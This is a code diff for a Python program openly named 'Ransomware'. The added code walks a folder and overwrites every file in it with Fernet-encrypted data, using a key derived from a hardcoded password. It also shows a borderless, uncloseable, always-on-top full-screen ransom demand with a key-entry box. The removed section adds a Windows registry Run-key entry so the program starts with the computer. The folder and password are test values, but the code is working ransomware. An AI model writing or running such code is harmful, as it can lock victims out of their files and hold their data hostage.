@@ -1,5 +1,65 @@
 import tkinter as tk
 from PIL import Image, ImageTk
+import os
+from pathlib import Path
+import hashlib
+from cryptography.fernet import Fernet
+import base64
+
+def generate_key(password):
+    hash = hashlib.sha256(password.encode()).digest()
+    return Fernet(base64.urlsafe_b64encode(hash[:32]))
+
+def encrypt_file(file_path, fernet):
+    try:
+        with open(file_path, 'rb') as f:
+            data = f.read()
+        encrypted = fernet.encrypt(data)
+        with open(file_path, 'wb') as f:
+            f.write(encrypted)
+        print(f"Encrypted: {file_path}")
+    except Exception as e:
+        print(f"Error encrypting {file_path}: {e}")
+
+def decrypt_file(file_path, fernet):
+    try:
+        with open(file_path, 'rb') as f:
+            data = f.read()
+        decrypted = fernet.decrypt(data)
+        with open(file_path, 'wb') as f:
+            f.write(decrypted)
+        print(f"Decrypted: {file_path}")
+    except Exception as e:
+        print(f"Error decrypting {file_path}: {e}")
+
+def process_folder(folder_path, password, mode='encrypt'):
+    fernet = generate_key(password)
+
+    processed_files = 0
+    error_files = 0
+    
+    if not os.path.exists(folder_path):
+        print(f"Folder {folder_path} does not exist!")
+        return 0, 0
+    
+    for root_dir, dirs, files in os.walk(folder_path):
+        for file in files:
+            full_path = os.path.join(root_dir, file)
+            try:
+                if mode == 'encrypt':
+                    encrypt_file(full_path, fernet)
+                elif mode == 'decrypt':
+                    decrypt_file(full_path, fernet)
+                processed_files += 1
+            except Exception as e:
+                print(f"Error on {full_path}: {e}")
+                error_files += 1
+    
+    print(f"Process complete. {processed_files} files processed, {error_files} errors.")
+    return processed_files, error_files
+
+folder_to_encrypt = Path.home() / "Desktop" / "test"
+password = "test"
 
 root = tk.Tk()
 root.title("Ransomware")
@@ -7,122 +67,63 @@ root.configure(bg="black")
 
 root.overrideredirect(True)
 root.protocol("WM_DELETE_WINDOW", lambda: None)
-root.attributes("-topmost", True)   
+root.attributes("-topmost", True)
+
 
 image_path = "Skull.png"
-
 original_image = Image.open(image_path)
-resized_image = original_image.resize((700, 400)) 
+resized_image = original_image.resize((700, 400))
 image = ImageTk.PhotoImage(resized_image)
-
 image_label = tk.Label(root, image=image, bg="black")
 image_label.place(relx=0.5, rely=0.4, anchor="center")
 
-text_label = tk.Label(root, text="YOUR FILES HAVE BEEN ENCRYPTED!", font=("Segui UI", 30, "bold"), fg="red", bg="black")
-text_label.place(relx=0.5, rely=0.65, anchor="center")  
+title_label = tk.Label(root, text="YOUR FILES HAVE BEEN ENCRYPTED!", font=("Segoe UI", 30, "bold"), fg="red", bg="black")
+title_label.place(relx=0.5, rely=0.65, anchor="center")
 
-text_label = tk.Label(root, text="Pay within 48 hours or lose all your files!", font=("Segui UI", 30, "bold"), fg="red", bg="black")
-text_label.place(relx=0.5, rely=0.7, anchor="center")  
+warning_label = tk.Label(root, text="Pay within 48 hours or lose all your files!", font=("Segoe UI", 30, "bold"), fg="red", bg="black")
+warning_label.place(relx=0.5, rely=0.7, anchor="center")
 
-def decrypt():
-    print("!")
+status_label = tk.Label(root, text="", font=("Segoe UI", 16), fg="white", bg="black")
+status_label.place(relx=0.5, rely=0.97, anchor="center")
 
-button = tk.Button(root, text="Click to Pay", font=("Segoe UI", 20), fg="black", bg="red", command=decrypt)
-button.place(relx=0.5, rely=0.75, anchor="center")
+key_label = tk.Label(root, text="Enter decryption key:",
+                    font=("Segoe UI", 20), fg="red", bg="black")
+key_label.place(relx=0.5, rely=0.8, anchor="center")
 
+key_entry = tk.Entry(root, font=("Segoe UI", 20), show="")
+key_entry.place(relx=0.5, rely=0.85, anchor="center")
+
+def decrypt_button_click():
+    user_key = key_entry.get()
+    if user_key == password:
+        status_label.config(text="Decryption in progress...", fg="yellow")
+        root.update()
+        processed, errors = process_folder(folder_to_encrypt, user_key, mode='decrypt')
+        status_label.config(text=f"Decryption successful! {processed} files processed, {errors} errors", fg="green")
+        
+        exit_button = tk.Button(root, text="Exit Program", 
+                              font=("Segoe UI", 12), fg="white", bg="gray", command=root.destroy)
+        exit_button.place(relx=0.9, rely=0.97, anchor="center")
+    else:
+        status_label.config(text="Incorrect key! Try again.", fg="red")
+
+pay_button = tk.Button(root, text="Click to Pay", 
+                     font=("Segoe UI", 20), fg="black", bg="red")
+pay_button.place(relx=0.5, rely=0.75, anchor="center")
+
+submit_button = tk.Button(root, text="Submit Key", 
+                        font=("Segoe UI", 20), fg="black", bg="red", command=decrypt_button_click)
+submit_button.place(relx=0.5, rely=0.92, anchor="center")
 
 screen_width = root.winfo_screenwidth()
 screen_height = root.winfo_screenheight()
-
 root.geometry(f"{screen_width}x{screen_height}+{0}+{0}")
 
-root.mainloop() 
+def run_encryption():
+    print(f"Starting encryption of files in {folder_to_encrypt}")
+    processed, errors = process_folder(folder_to_encrypt, password, mode='encrypt')
+    print(f"Encryption complete. {processed} files processed, {errors} errors.")
 
+run_encryption()
 
-
-#Test
-
-import tkinter as tk
-from PIL import Image, ImageTk
-import os
-import sys
-import winreg as reg
-import threading
-
-def add_to_startup():
-    # Get the path of the current script and add it to startup registry
-    script_path = sys.argv[0]
-    registry_key = r"SOFTWARE\Microsoft\Windows\CurrentVersion\Run"
-    reg.CreateKey(reg.HKEY_CURRENT_USER, registry_key)
-    reg_key = reg.OpenKey(reg.HKEY_CURRENT_USER, registry_key, 0, reg.KEY_WRITE)
-    reg.SetValueEx(reg_key, "RansomwareApp", 0, reg.REG_SZ, script_path)
-    reg.CloseKey(reg_key)
-
-def remove_from_startup():
-    # Remove from startup if needed (for cleanup)
-    script_path = sys.argv[0]
-    registry_key = r"SOFTWARE\Microsoft\Windows\CurrentVersion\Run"
-    reg_key = reg.OpenKey(reg.HKEY_CURRENT_USER, registry_key, 0, reg.KEY_WRITE)
-    try:
-        reg.DeleteValue(reg_key, "RansomwareApp")
-    except FileNotFoundError:
-        pass
-    reg.CloseKey(reg_key)
-
-def on_closing():
-    # Prevent closing
-    pass
-
-def decrypt():
-    print("You clicked to pay! (This is just for educational purposes!)")
-
-def show_on_all_screens():
-    # Get all available screen sizes and place the window on each
-    screen_width = root.winfo_screenwidth()
-    screen_height = root.winfo_screenheight()
-
-    # For multiple monitors
-    screens = root.winfo_screenwidth()
-    if screens > 1:
-        for screen in range(screens):
-            root.geometry(f"{screen_width}x{screen_height}+{screen * screen_width}+0")
-            root.update()
-            time.sleep(0.1)  # Giving the window time to display on each screen.
-    else:
-        root.geometry(f"{screen_width}x{screen_height}+0+0")
-
-# Set the app to open at startup when run
-add_to_startup()
-
-root = tk.Tk()
-root.title("Ransomware")
-root.configure(bg="black")
-root.overrideredirect(True)  # Hide the window border
-root.protocol("WM_DELETE_WINDOW", on_closing)  # Disable closing
-root.attributes("-topmost", True)  # Always on top
-
-image_path = "Skull.png"
-original_image = Image.open(image_path)
-resized_image = original_image.resize((700, 400)) 
-image = ImageTk.PhotoImage(resized_image)
-
-image_label = tk.Label(root, image=image, bg="black")
-image_label.place(relx=0.5, rely=0.4, anchor="center")
-
-text_label = tk.Label(root, text="YOUR FILES HAVE BEEN ENCRYPTED!", font=("Impact", 40, "bold"), fg="red", bg="black")
-text_label.place(relx=0.5, rely=0.65, anchor="center")
-
-text_label = tk.Label(root, text="Pay within 48 hours or lose all your files!", font=("Impact", 30, "bold"), fg="red", bg="black")
-text_label.place(relx=0.5, rely=0.7, anchor="center")
-
-button = tk.Button(root, text="Click to Pay", font=("Segoe UI", 20), fg="black", bg="red", command=decrypt)
-button.place(relx=0.5, rely=0.75, anchor="center")
-
-# Show on all screens
-show_on_all_screens()
-
-# Full screen
-root.geometry(f"{root.winfo_screenwidth()}x{root.winfo_screenheight()}+0+0")
-
-# Start the app
 root.mainloop()
